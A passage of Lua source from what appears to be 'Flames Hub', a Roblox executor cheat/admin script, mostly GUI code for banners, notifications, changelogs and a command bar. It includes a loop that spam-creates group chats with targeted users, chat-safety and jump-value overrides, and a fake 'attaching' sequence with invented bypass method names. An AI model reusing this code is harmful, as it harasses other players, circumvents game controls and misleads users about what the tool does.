      if typeof(genv.Viewing_Plr_Tbl) ~= "table" then
         genv.Viewing_Plr_Tbl = {}
      end

      if next(genv.Viewing_Plr_Tbl) == nil then
         return genv.notify(
            "Error",
            "Viewing table is empty (tried unviewing nobody? how?).",
            10
         )
      end

      local viewed
      for k, v in pairs(genv.Viewing_Plr_Tbl) do
         viewed = (typeof(v) == "Instance" and v.DisplayName) or k
         break
      end

      genv.Viewing_A_Player = false
      table.clear(genv.Viewing_Plr_Tbl)

      genv.notify("Success", "Stopped viewing: " .. tostring(viewed), 5)
   end

   getgenv().check_friend = function(Player)
      if Player ~= getgenv().LocalPlayer and Player:IsFriendsWith(getgenv().LocalPlayer.UserId) then
         return true
      else
         return false
      end

      return 
   end

   getgenv().spam_create_groups = function(toggle)
      if toggle == true then
         getgenv().group_chatting_users = getgenv().group_chatting_users or {}
         getgenv().Creating_Groups = true

         while getgenv().Creating_Groups do
            fw(0)
            for _, name in ipairs(getgenv().group_chatting_users) do
               local success, userId = pcall(function()
                  return Players:GetUserIdFromNameAsync(name)
               end)
               
               if success and userId then
                  getgenv().Get("new_group", userId)
               end
            end
         end
      elseif toggle == false then
         getgenv().Creating_Groups = false
      else
         return 
      end
   end

   getgenv().attach_with_script = function()
      local Methods = {
         "Secret",
         "Sneaky",
         "Private",
         "Normal",
         "Bypass",
         "External",
         "Internal",
         "Rage",
         "Silent",
         "Source",
         "MainClass",
         "Class_C",
         "Non-Closure",
         "Encoded",
         "Bytecode",
         "Obfuscated"
      }

      local Attached = false
      getgenv().Script_Was_Attached_Successfully = Attached
      local Old_Text = getgenv().CreditsLabelText.Text
      task.wait(0.4)
      for i = 1, 3 do
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Starting]: Attaching."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Starting]: Attaching.."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Starting]: Attaching..."
      end
      task.wait(.1)
      Attached = true
      task.wait(.1)
      if Attached == true then
         getgenv().CreditsLabelText.Text = "[Starting]: Getting requirements."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Starting]: Getting requirements.."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Starting]: Getting requirements..."
         wait(0.5)
         getgenv().CreditsLabelText.Text = "[Success]: Got requirements successfully!"
         wait(0.6)
         for i = 1, 3 do
            wait(0.6)
            getgenv().CreditsLabelText.Text = "[Initializing]: Collecting prerequisites."
            wait(0.6)
            getgenv().CreditsLabelText.Text = "[Initializing]: Collecting prerequisites.."
            wait(0.6)
            getgenv().CreditsLabelText.Text = "[Initializing]: Collecting prerequisites..."
         end
      end
      task.wait(0.3)
      for i = 1, 8 do
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Finalizing]: Collecting prerequisites."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Finalizing]: Collecting prerequisites.."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Finalizing]: Collecting prerequisites..."
      end
      fw(0.2)
      for i = 1, 4 do
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Finishing]: Selecting method."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Finishing]: Selecting method.."
         wait(0.6)
         getgenv().CreditsLabelText.Text = "[Finishing]: Selecting method..."
      end
      task.wait(0.3)
      local function ChooseMethod()
         return Methods[math.random(1, #Methods)]
      end

      getgenv().CreditsLabelText.Text = "[Finished]: Method: "..tostring(ChooseMethod())
      wait(0.7)
      getgenv().CreditsLabelText.Text = "Attached."
      wait(0.8)
      getgenv().CreditsLabelText.Text = Old_Text
   end

   getgenv().PlotAreas = {}

   getgenv().update_plot_areas = function()
      table.clear(getgenv().PlotAreas)
      fw(0.2)
      for _, v in ipairs(getgenv().Workspace:GetDescendants()) do
         if v:IsA("BasePart") and v.Name == "PlotArea" then
            getgenv().PlotAreas[v] = v
         end
      end
   end

   savePrefix(getgenv().AdminPrefix)

   getgenv().in_humanoid_vehicle = function(PlayerOrName)
      local HumanoidVehicles = getgenv().Workspace:FindFirstChild("HumanoidVehicles", true)
      if not HumanoidVehicles then return end

      local Player = PlayerOrName
      if typeof(PlayerOrName) == "string" then
         Player = getgenv().Players:FindFirstChild(PlayerOrName)
         if not Player then return end
      end

      local Character = Player == getgenv().LocalPlayer and getgenv().Character or Player.Character
      if not Character then return end

      local humanoid = Character:FindFirstChildWhichIsA("Humanoid")
      if not humanoid then return end

      local vehicleAttr = humanoid:GetAttribute("InHumanoidVehicle")
      if vehicleAttr == nil then return end

      if type(getgenv().Humanoid_Vehicles) ~= "table" then return end
      if not table.find(getgenv().Humanoid_Vehicles, vehicleAttr) then return end

      return vehicleAttr
   end

   getgenv().hum_vehicle_name = getgenv().hum_vehicle_name or function(plr)
      local hv = in_humanoid_vehicle(plr)
      if not hv then return nil end

      local folder = getgenv().Workspace:FindFirstChild("HumanoidVehicles", true)
      if not folder then return nil end

      local inst = folder:FindFirstChild(hv)
      if not inst then return nil end

      return inst.Name
   end

   getgenv().set_hum_vehicle_speed = getgenv().set_hum_vehicle_speed or function(speed)
      speed = tonumber(speed) or 50

      if typeof(speed) ~= "number" then
         speed = 50
      end

      if in_humanoid_vehicle(getgenv().LocalPlayer) then
         pcall(function() getgenv().Humanoid.WalkSpeed = tonumber(speed) end)
      end
   end

   update_plot_areas()

   if CoreGui:FindFirstChild("TemporaryBanner_GUI") then
      pcall(function()
         if getgenv().renderConn then
            getgenv().renderConn:Disconnect()
            getgenv().renderConn = nil
         end
         if getgenv().camConn then
            getgenv().camConn:Disconnect()
            getgenv().camConn = nil
         end
         if screenGui and screenGui.Parent then
            screenGui:Destroy()
         end
         getgenv().updatePosition = nil
         getgenv().clamp = nil
      end)
   end
   wait(0.7)
   local screenGui = Instance.new("ScreenGui")
   screenGui.Name = "TemporaryBanner_GUI"
   screenGui.ResetOnSpawn = false
   screenGui.IgnoreGuiInset = true
   screenGui.Parent = CoreGui

   local frame = Instance.new("Frame")
   frame.Name = "BannerFrame"
   frame.AnchorPoint = Vector2.new(0.5, 0)
   frame.Position = UDim2.new(0.5, 0, 0, 20)
   frame.Size = UDim2.new(0.6, 0, 0, 48)
   frame.BackgroundTransparency = 0
   frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
   frame.BorderSizePixel = 0
   frame.Parent = screenGui

   make_round(frame, 12)
   flowrgb("banner_announcement_frame_flowing_rgb_smooth_conn", 3.5, frame, true)
   getgenv().make_stroke(frame, 1.5, 0.25)

   local label = Instance.new("TextLabel")
   label.Name = "BannerText"
   label.AnchorPoint = Vector2.new(0.5, 0.5)
   label.Position = UDim2.new(0.5, 0, 0.5, 0)
   label.Size = UDim2.new(0.95, 0, 0.9, 0)
   label.BackgroundTransparency = 1
   label.Text = tostring(Announcement_Message)
   label.Font = Enum.Font.GothamBold
   label.TextScaled = true
   label.RichText = false
   label.TextWrapped = true
   label.TextColor3 = Color3.fromRGB(255, 255, 255)
   label.Parent = frame

   local shadow = Instance.new("ImageLabel")
   shadow.Name = "Shadow"
   shadow.AnchorPoint = Vector2.new(0.5, 0)
   shadow.Position = UDim2.new(0.5, 0, 0, 24)
   shadow.Size = UDim2.new(0.62, 0, 0, 56)
   shadow.Image = "rbxassetid://5059716102"
   shadow.BackgroundTransparency = 1
   shadow.ImageTransparency = 0.8
   shadow.ZIndex = frame.ZIndex - 1
   shadow.Parent = screenGui
   shadow.Visible = false

   getgenv().clamp = getgenv().clamp or function(n, lo, hi)
      if n < lo then return lo end
      if n > hi then return hi end

      return n
   end

   getgenv().updatePosition = getgenv().updatePosition or function()
      vw, vh = getgenv().Workspace.CurrentCamera.ViewportSize.X, getgenv().Workspace.CurrentCamera.ViewportSize.Y
      widthScale = clamp(0.6, 0.4, 0.8)

      heightPx = clamp(math.floor(vh * 0.07), 36, 72)

      frame.Size = UDim2.new(widthScale, 0, 0, heightPx)

      topOffset = math.max(12, math.floor(vh * 0.03))
      frame.Position = UDim2.new(0.5, 0, 0, topOffset)
      shadow.Position = UDim2.new(0.5, 0, 0, topOffset + math.floor(heightPx/2))
      shadow.Size = UDim2.new(widthScale + 0.02, 0, 0, heightPx + 12)
   end

   updatePosition()

   getgenv().renderConn = nil
   getgenv().camConn = nil
   getgenv().renderConn = RunService.RenderStepped:Connect(function() end)
   if getgenv().Workspace and getgenv().Workspace.CurrentCamera then
      getgenv().camConn = getgenv().Workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updatePosition)
   end

   frame.BackgroundTransparency = 1
   label.TextTransparency = 1
   shadow.ImageTransparency = 1

   appearInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
   TweenService:Create(frame, appearInfo, {BackgroundTransparency = 0}):Play()
   TweenService:Create(label, appearInfo, {TextTransparency = 0}):Play()
   shadow.Visible = false
   TweenService:Create(shadow, appearInfo, {ImageTransparency = 0.8}):Play()

   displayTime = displayTimeMax
   delay(displayTime, function()
      fadeInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
      t1 = TweenService:Create(frame, fadeInfo, {BackgroundTransparency = 1})
      t2 = TweenService:Create(label, fadeInfo, {TextTransparency = 1})
      t3 = TweenService:Create(shadow, fadeInfo, {ImageTransparency = 1})

      t1:Play(); t2:Play(); t3:Play()
      t1.Completed:Wait()

      pcall(function()
         if getgenv().renderConn then
            getgenv().renderConn:Disconnect()
            getgenv().renderConn = nil
         end
         if getgenv().camConn then
            getgenv().camConn:Disconnect()
            getgenv().camConn = nil
         end
         screenGui:Destroy()
      end)
   end)

   getgenv().spawn_notif_announcement_flames_hub = function(msg, duration)
      local lp = getgenv().LocalPlayer or Players.LocalPlayer
      if not lp then return end
      duration = (type(duration) == "number" and duration > 0) and duration or 5
      local notif_id = "FlamesNotif_" .. tostring(tick())
      local function clamp_val(n, lo, hi)
         if n < lo then return lo end
         if n > hi then return hi end
         return n
      end

      local function make_round(obj, radius)
         local Corner = Instance.new("UICorner")
         Corner.CornerRadius = UDim.new(0, radius)
         Corner.Parent = obj
      end

      local function make_stroke(obj, thickness, transparency, color)
         local Stroke = Instance.new("UIStroke")
         Stroke.Thickness = thickness
         Stroke.Transparency = transparency
         Stroke.Color = color or Color3.fromRGB(255, 255, 255)
         Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
         Stroke.Parent = obj
      end

      local function make_glow(parent)
         local Glow = Instance.new("ImageLabel")
         Glow.Name = "GlowLayer"
         Glow.AnchorPoint = Vector2.new(0.5, 0.5)
         Glow.Position = UDim2.new(0.5, 0, 0.5, 0)
         Glow.Size = UDim2.new(1.18, 0, 2.4, 0)
         Glow.BackgroundTransparency = 1
         Glow.Image = "rbxassetid://5028857084"
         Glow.ImageColor3 = Color3.fromRGB(120, 80, 255)
         Glow.ImageTransparency = 0.72
         Glow.ZIndex = parent.ZIndex - 1
         Glow.ScaleType = Enum.ScaleType.Stretch
         Glow.Parent = parent.Parent
         return Glow
      end

      local Gui = Instance.new("ScreenGui")
      Gui.Name = notif_id
      Gui.ResetOnSpawn = false
      Gui.IgnoreGuiInset = true
      Gui.DisplayOrder = 999
      Gui.Parent = CoreGui

      local Cam = workspace.CurrentCamera
      local vh = Cam and Cam.ViewportSize.Y or 720
      local frame_w = 0.54
      local frame_h = clamp_val(math.floor(vh * 0.075), 44, 78)
      local bottom_offset = clamp_val(math.floor(vh * 0.045), 22, 52)
      local Container = Instance.new("Frame")
      Container.Name = "NotifContainer"
      Container.AnchorPoint = Vector2.new(0.5, 1)
      Container.Position = UDim2.new(0.5, 0, 1, frame_h + 12)
      Container.Size = UDim2.new(frame_w, 0, 0, frame_h)
      Container.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
      Container.BackgroundTransparency = 0.08
      Container.BorderSizePixel = 0
      Container.ZIndex = 10
      Container.ClipsDescendants = false
      Container.Parent = Gui

      make_round(Container, 10)
      make_stroke(Container, 1.2, 0.55, Color3.fromRGB(200, 160, 255))

      local Glow_Img = make_glow(Container)
      local Icon_Box = Instance.new("Frame")
      Icon_Box.Name = "IconBox"
      Icon_Box.AnchorPoint = Vector2.new(0, 0.5)
      Icon_Box.Position = UDim2.new(0, 10, 0.5, 0)
      Icon_Box.Size = UDim2.new(0, frame_h - 16, 0, frame_h - 16)
      Icon_Box.BackgroundColor3 = Color3.fromRGB(110, 60, 220)
      Icon_Box.BackgroundTransparency = 0.2
      Icon_Box.BorderSizePixel = 0
      Icon_Box.ZIndex = 11
      Icon_Box.Parent = Container

      make_round(Icon_Box, 7)

      local Icon_Label = Instance.new("TextLabel")
      Icon_Label.Name = "Icon"
      Icon_Label.AnchorPoint = Vector2.new(0.5, 0.5)
      Icon_Label.Position = UDim2.new(0.5, 0, 0.5, 0)
      Icon_Label.Size = UDim2.new(0.85, 0, 0.85, 0)
      Icon_Label.BackgroundTransparency = 1
      Icon_Label.Text = "📣"
      Icon_Label.TextScaled = true
      Icon_Label.Font = Enum.Font.GothamBold
      Icon_Label.TextColor3 = Color3.fromRGB(255, 255, 255)
      Icon_Label.ZIndex = 12
      Icon_Label.Parent = Icon_Box

      local icon_size = frame_h - 16
      local text_pad_left = 10 + icon_size + 10
      local Msg_Label = Instance.new("TextLabel")
      Msg_Label.Name = "MsgLabel"
      Msg_Label.AnchorPoint = Vector2.new(0, 0.5)
      Msg_Label.Position = UDim2.new(0, text_pad_left, 0.5, 0)
      Msg_Label.Size = UDim2.new(1, -(text_pad_left + 10), 0.78, 0)
      Msg_Label.BackgroundTransparency = 1
      Msg_Label.Text = tostring(msg)
      Msg_Label.Font = Enum.Font.GothamSemibold
      Msg_Label.TextScaled = true
      Msg_Label.RichText = false
      Msg_Label.TextWrapped = true
      Msg_Label.TextXAlignment = Enum.TextXAlignment.Left
      Msg_Label.TextColor3 = Color3.fromRGB(235, 235, 240)
      Msg_Label.TextTransparency = 1
      Msg_Label.ZIndex = 11
      Msg_Label.Parent = Container

      local Progress_Bg = Instance.new("Frame")
      Progress_Bg.Name = "ProgressBg"
      Progress_Bg.AnchorPoint = Vector2.new(0.5, 1)
      Progress_Bg.Position = UDim2.new(0.5, 0, 1, 0)
      Progress_Bg.Size = UDim2.new(1, 0, 0, 3)
      Progress_Bg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
      Progress_Bg.BackgroundTransparency = 0.3
      Progress_Bg.BorderSizePixel = 0
      Progress_Bg.ZIndex = 12
      Progress_Bg.ClipsDescendants = true
      Progress_Bg.Parent = Container

      make_round(Progress_Bg, 4)

      local Progress_Bar = Instance.new("Frame")
      Progress_Bar.Name = "ProgressBar"
      Progress_Bar.AnchorPoint = Vector2.new(0, 0.5)
      Progress_Bar.Position = UDim2.new(0, 0, 0.5, 0)
      Progress_Bar.Size = UDim2.new(1, 0, 1, 0)
      Progress_Bar.BackgroundColor3 = Color3.fromRGB(150, 90, 255)
      Progress_Bar.BorderSizePixel = 0
      Progress_Bar.ZIndex = 13
      Progress_Bar.Parent = Progress_Bg

      make_round(Progress_Bar, 4)

      local Slide_In = TweenInfo.new(0.38, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
      local Slide_Out = TweenInfo.new(0.32, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
      local Fade_In = TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

      Container.BackgroundTransparency = 1
      Glow_Img.ImageTransparency = 1

      local target_y = UDim2.new(0.5, 0, 1, -bottom_offset)

      TweenService:Create(Container, Slide_In, {Position = target_y, BackgroundTransparency = 0.08}):Play()
      TweenService:Create(Glow_Img, Fade_In, {ImageTransparency = 0.72}):Play()
      TweenService:Create(Msg_Label, Fade_In, {TextTransparency = 0}):Play()

      local pulse_conn
      local pulse_step = 0

      pulse_conn = RunService.Heartbeat:Connect(function(dt)
         pulse_step = pulse_step + dt * 1.8
         local alpha = (math.sin(pulse_step * math.pi) + 1) / 2
         local lo_trans = 0.65
         local hi_trans = 0.88
         Glow_Img.ImageTransparency = lo_trans + (hi_trans - lo_trans) * (1 - alpha)
         local lo_r, lo_g, lo_b = 100, 55, 210
         local hi_r, hi_g, hi_b = 160, 100, 255
         Glow_Img.ImageColor3 = Color3.fromRGB(
            math.floor(lo_r + (hi_r - lo_r) * alpha),
            math.floor(lo_g + (hi_g - lo_g) * alpha),
            math.floor(lo_b + (hi_b - lo_b) * alpha)
         )
      end)

      local cam_conn
      if Cam then
         cam_conn = Cam:GetPropertyChangedSignal("ViewportSize"):Connect(function()
            local nh = Cam.ViewportSize.Y
            local new_h = clamp_val(math.floor(nh * 0.075), 44, 78)
            local new_bot = clamp_val(math.floor(nh * 0.045), 18, 52)
            Container.Size = UDim2.new(frame_w, 0, 0, new_h)
            Container.Position = UDim2.new(0.5, 0, 1, -new_bot)
         end)
      end

      local Progress_Tween = TweenService:Create(
         Progress_Bar,
         TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.In),
         {Size = UDim2.new(0, 0, 1, 0)}
      )
      Progress_Tween:Play()

      task.delay(duration, function()
         Progress_Tween:Cancel()

         if pulse_conn then pulse_conn:Disconnect() pulse_conn = nil end
         if cam_conn then cam_conn:Disconnect() cam_conn = nil end

         local Fo_1 = TweenService:Create(Container, Slide_Out, {
            Position = UDim2.new(0.5, 0, 1, frame_h + 20),
            BackgroundTransparency = 1
         })
         local Fo_2 = TweenService:Create(Msg_Label, Slide_Out, {TextTransparency = 1})
         local Fo_3 = TweenService:Create(Glow_Img, Slide_Out, {ImageTransparency = 1})

         Fo_1:Play(); Fo_2:Play(); Fo_3:Play()
         Fo_1.Completed:Wait()

         pcall(function() Gui:Destroy() end)
      end)
   end

   getgenv().Flames_Announce_WS_URL = getgenv().Flames_Announce_WS_URL or nil
   getgenv().listen_announce = function(ws)
      if not ws then return end

      if not getgenv().Main_Announcement_Connections_Created_In_WebSocket_Flames_Hub then
         getgenv().Main_Announcement_Connections_Created_In_WebSocket_Flames_Hub = true
         ws.OnMessage:Connect(function(raw_msg)
            local ok, data = pcall(function()
               return game:GetService("HttpService"):JSONDecode(raw_msg)
            end)

            if not ok or type(data) ~= "table" then return end
            if data.type ~= "announce" then return end

            local txt = data.text
            local dur = data.display_time

            if type(txt) == "string" and #txt > 0 then
               getgenv().spawn_notif_announcement_flames_hub(txt, dur)
            end
         end)

         ws.OnClose:Connect(function()
            if not getgenv().ListeningFor_Announcements_Through_Flames_Hub_WebSocket_Server then
               return 
            end

            local max_retries = 10
            local retry_delay = 5

            task.spawn(function()
               for attempt = 1, max_retries do
                  task.wait(retry_delay)

                  if not getgenv().ListeningFor_Announcements_Through_Flames_Hub_WebSocket_Server then
                     break
                  end

                  local url = getgenv().Flames_Announce_WS_URL
                  if not url then break end

                  local ok, new_ws = pcall(function()
                     return WebSocket and WebSocket.connect(url)
                  end)

                  if ok and new_ws then
                     getgenv().ws_conn = new_ws
                     getgenv().listen_announce(new_ws)
                     break
                  end

                  if attempt >= 5 then
                     retry_delay = math.min(retry_delay * 1.5, 30)
                  end
               end
            end)
         end)
      end
   end
   fw(0.1)
   task.spawn(function()
      local timeout = 10
      local elapsed = 0

      repeat
         task.wait(0.5)
         elapsed = elapsed + 0.5
      until getgenv().ws_conn or elapsed >= timeout

      if not getgenv().ws_conn or not getgenv().chat_connected then
         pcall(function() getgenv().start_reconnect() end)
      end

      if not getgenv().ListeningFor_Announcements_Through_Flames_Hub_WebSocket_Server then
         getgenv().ListeningFor_Announcements_Through_Flames_Hub_WebSocket_Server = true
         getgenv().listen_announce(getgenv().ws_conn)
      end
   end)

   -- [[ Welcome aboard Changelogs GUI! ]] --
   getgenv().CreateChangelogGUI = function()
      if getgenv().ChangelogGUI_Loaded then
         notify("Warning","Changelogs GUI is already loaded.",5)
         return
      end
      getgenv().ChangelogGUI_Loaded = true

      if getgenv().smooth_drag_cmdmenu_gui then
         getgenv().smooth_drag_cmdmenu_gui:Disconnect()
         getgenv().smooth_drag_cmdmenu_gui = nil
      end

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = "ChangelogScreen"
      ScreenGui.ResetOnSpawn = false
      ScreenGui.IgnoreGuiInset = true
      ScreenGui.Parent = parent_gui

      local ChangelogGUI = Instance.new("Frame")
      ChangelogGUI.Name = "ChangelogGUI"
      getgenv().MainChangelogs_GUI_Frame = ChangelogGUI

      if not isMobile then
         ChangelogGUI.Size = UDim2.new(0,550,0,400)
         ChangelogGUI.Position = UDim2.new(0.5,-275,0.5,-200)
      else
         ChangelogGUI.Size = UDim2.new(0,300,0,320)
         ChangelogGUI.Position = UDim2.new(0.5,-903,0.5,-20)
      end

      ChangelogGUI.BackgroundColor3 = Color3.fromRGB(30,30,30)
      ChangelogGUI.BorderSizePixel = 0
      ChangelogGUI.Parent = ScreenGui

      --flowrgb("ChangelogGUIFlowConn",3,ChangelogGUI,true)

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0,12)
      UICorner.Parent = ChangelogGUI

      local TitleBar = Instance.new("Frame")
      TitleBar.Size = UDim2.new(1,0,0,35)
      TitleBar.BackgroundTransparency = 1
      TitleBar.Parent = ChangelogGUI

      local TitleLabel = Instance.new("TextLabel")
      TitleLabel.Size = UDim2.new(1,-35,1,0)
      TitleLabel.Position = UDim2.new(0,3,0,2)
      TitleLabel.BackgroundTransparency = 1
      TitleLabel.Text = "Flames Hub - Changelogs"
      TitleLabel.Font = Enum.Font.GothamBold
      TitleLabel.TextScaled = true
      TitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
      TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
      TitleLabel.Parent = TitleBar

      local CloseButton = Instance.new("TextButton")
      CloseButton.Size = UDim2.new(0,30,0,30)
      CloseButton.Position = UDim2.new(1,-30,0.5,-2)
      CloseButton.AnchorPoint = Vector2.new(0,0.5)
      CloseButton.BackgroundColor3 = Color3.fromRGB(200,50,50)
      CloseButton.Text = "X"
      CloseButton.TextScaled = true
      CloseButton.Font = Enum.Font.GothamBold
      CloseButton.TextColor3 = Color3.fromRGB(255,255,255)
      CloseButton.Parent = TitleBar
      Instance.new("UICorner",CloseButton).CornerRadius = UDim.new(0,6)

      local ScrollingFrame = Instance.new("ScrollingFrame")
      ScrollingFrame.Size = UDim2.new(1,0,1,-35)
      ScrollingFrame.Position = UDim2.new(0,0,0,35)
      ScrollingFrame.CanvasSize = UDim2.new(0,0,0,0)
      ScrollingFrame.BackgroundTransparency = 1
      ScrollingFrame.ScrollBarThickness = 6
      ScrollingFrame.Parent = ChangelogGUI

      local Layout = Instance.new("UIListLayout")
      Layout.Padding = UDim.new(0,10)
      Layout.SortOrder = Enum.SortOrder.LayoutOrder
      Layout.Parent = ScrollingFrame

      Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         ScrollingFrame.CanvasSize = UDim2.new(0,0,0,Layout.AbsoluteContentSize.Y + 10)
      end)

      local Padding = Instance.new("UIPadding")
      Padding.PaddingTop = isMobile and UDim.new(0,5) or UDim.new(0,10)
      Padding.Parent = ScrollingFrame

      CloseButton.MouseButton1Click:Connect(function()
         ScreenGui:Destroy()
         getgenv().ChangelogGUI_Loaded = false
      end)

      dragify(ChangelogGUI)

      function AddChangelog(date,text)
         local Container = Instance.new("Frame")
         Container.Size = UDim2.new(1,0,0,90)
         Container.BackgroundColor3 = Color3.fromRGB(40,40,40)
         Container.BorderSizePixel = 0
         Container.Parent = ScrollingFrame
         Instance.new("UICorner",Container).CornerRadius = UDim.new(0,8)

         local DateLabel = Instance.new("TextLabel")
         DateLabel.Size = UDim2.new(1,-10,0,25)
         DateLabel.Position = UDim2.new(0,10,0,5)
         DateLabel.BackgroundTransparency = 1
         DateLabel.Font = Enum.Font.GothamBold
         DateLabel.TextScaled = true
         DateLabel.TextColor3 = Color3.fromRGB(255,255,255)
         DateLabel.TextXAlignment = Enum.TextXAlignment.Left
         DateLabel.Text = date
         DateLabel.Parent = Container

         local TextLabel = Instance.new("TextLabel")
         TextLabel.Size = UDim2.new(1,-20,0,55)
         TextLabel.Position = UDim2.new(0,10,0,35)
         TextLabel.BackgroundTransparency = 1
         TextLabel.Font = Enum.Font.Gotham
         TextLabel.TextScaled = true
         TextLabel.TextColor3 = Color3.fromRGB(255,255,255)
         TextLabel.TextXAlignment = Enum.TextXAlignment.Left
         TextLabel.TextWrapped = true
         TextLabel.Text = text
         TextLabel.Parent = Container
      end

      task.spawn(function()
         local ok,data = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/LifeTogetherAdminChangeLogs/refs/heads/main/LifeTogetherAdmin_Changelogs.js")
         end)

         if not ok or not data or data == "" then
            AddChangelog("Error","Failed to load changelogs.")
            return
         end

         local loaded = false

         for block in string.gmatch(data,"[^\n][^\n]*\n.-\n\n") do
            local header,body = block:match("^(.-)\n(.*)")
            if header and body then
               body = body:gsub("\n+$","")
               AddChangelog(header,body)
               loaded = true
            end
         end

         if not loaded then
            AddChangelog("Notice","Changelog file loaded, but no readable entries were found.")
         end
      end)
   end
   fw(0.2)
   if not getgenv().HasSeen_Changelogs_GUI_Startup then
      CreateChangelogGUI()

      getgenv().HasSeen_Changelogs_GUI_Startup = true
   end

   if not getgenv().SetupGone_Through_Flames_Hub then
      pcall(function()
         getgenv().LocalPlayer:SetSuperSafeChat(false)
         getgenv().LocalPlayer.CameraMaxZoomDistance = 100000
         getgenv().LocalPlayer.CameraMinZoomDistance = 0.5
      
         if getgenv().LocalPlayer.CameraMaxZoomDistance > 90000 then
            notify("Success", "Set CameraMaxZoomDistance to: "..tostring(getgenv().LocalPlayer.CameraMaxZoomDistance), 7)
         else
            notify("Warning", "We we're not able to correctly set CameraMaxZoomDistance!", 5)
         end
         if getgenv().LocalPlayer.CameraMinZoomDistance < 5 then
            notify("Success", "Set CameraMinZoomDistance to: "..tostring(getgenv().LocalPlayer.CameraMinZoomDistance), 7)
         else
            notify("Warning", "We we're not able to correctly set CameraMinZoomDistance!", 5)
         end

         if getgenv().StarterPlayer.CharacterUseJumpPower then
            getgenv().Humanoid.JumpPower = 50
            notify("Success", "Spoofed JumpPower to: "..tostring(getgenv().Humanoid.JumpPower))
         else
            getgenv().Humanoid.JumpHeight = 7
            notify("Success", "Spoofed JumpHeight to: "..tostring(getgenv().Humanoid.JumpHeight))
         end
         getgenv().StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
         if getgenv().LocalPlayer.Name == "CIippedByAura" or getgenv().LocalPlayer.Name == "L0CKED_1N1" then
            getgenv().StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
            notify("Success", "Enabled Leaderboard & Backpack.", 5)
         else
            notify("Success", "Enabled Leaderboard.", 5)
         end
      end)

      getgenv().SetupGone_Through_Flames_Hub = true
   end

   getgenv().command_bar_GUI = function(forceOpen)
      if getgenv().__cmdbarloaded then
         if getgenv().togglecommandbar then
            getgenv().togglecommandbar(forceOpen)
         end
         return
      end

      getgenv().__cmdbarloaded = true
      getgenv().__cmdbar_busy = false
      getgenv().commandHistory = getgenv().commandHistory or {}
      getgenv().historyIndex = #getgenv().commandHistory + 1

      local rootGui = (gethui and gethui()) or (get_hidden_gui and get_hidden_gui()) or getgenv().CoreGui
      local swallowing_prefix = false
      local guiMain = Instance.new("ScreenGui")
      guiMain.Name = "CmdBar_UI"
      guiMain.Parent = rootGui
      guiMain.IgnoreGuiInset = true
      guiMain.ResetOnSpawn = false

      local holder = Instance.new("Frame")
      holder.Parent = guiMain
      holder.AnchorPoint = Vector2.new(0.5,0)
      holder.Position = UDim2.new(0.5,0,0,-60)
      holder.Size = UDim2.new(0.8,0,0,50)
      holder.BackgroundColor3 = Color3.fromRGB(30,30,30)
      holder.BackgroundTransparency = 0.15
      holder.BorderSizePixel = 0
      holder.Visible = false
      holder.ZIndex = 6
      Instance.new("UICorner", holder).CornerRadius = UDim.new(0,8)

      local inputBox = Instance.new("TextBox")
      inputBox.Parent = holder
      inputBox.AnchorPoint = Vector2.new(0.5,0.5)
      inputBox.Position = UDim2.new(0.5,0,0.5,0)
      inputBox.Size = UDim2.new(1,-20,1,-10)
      inputBox.BackgroundTransparency = 1
      inputBox.Text = ""
      inputBox.PlaceholderText = tostring(getgenv().AdminPrefix or ";")
      inputBox.TextColor3 = Color3.new(1,1,1)
      inputBox.Font = Enum.Font.GothamMedium
      inputBox.TextScaled = true
      inputBox.ClearTextOnFocus = false
      inputBox.ZIndex = 7

      local historyFrame = Instance.new("Frame")
      historyFrame.Parent = guiMain
      historyFrame.AnchorPoint = Vector2.new(0.5,0)
      historyFrame.Position = UDim2.new(0.5,0,0,60)
      historyFrame.Size = UDim2.new(0.8,0,0,160)
      historyFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
      historyFrame.BackgroundTransparency = 0.1
      historyFrame.Visible = false
      historyFrame.ZIndex = 6
      historyFrame.BorderSizePixel = 0
      Instance.new("UICorner", historyFrame).CornerRadius = UDim.new(0,8)

      local listLayout = Instance.new("UIListLayout")
      listLayout.Parent = historyFrame
      listLayout.Padding = UDim.new(0,6)

      local openState = false
      local historyButtons = {}
      local openUI, closeUI

      local function rebuildHistory()
         for _,v in ipairs(historyFrame:GetChildren()) do
            if v:IsA("TextButton") then
               v:Destroy()
            end
         end
         historyButtons = {}

         for i = #getgenv().commandHistory, math.max(#getgenv().commandHistory-9,1), -1 do
            local cmd = getgenv().commandHistory[i]
            local btn = Instance.new("TextButton")
            btn.Name = tostring(cmd)
            btn.Parent = historyFrame
            btn.Size = UDim2.new(1,-12,0,28)
            btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
            btn.TextColor3 = Color3.new(1,1,1)
            btn.Text = cmd
            btn.Font = Enum.Font.Gotham
            btn.TextScaled = true
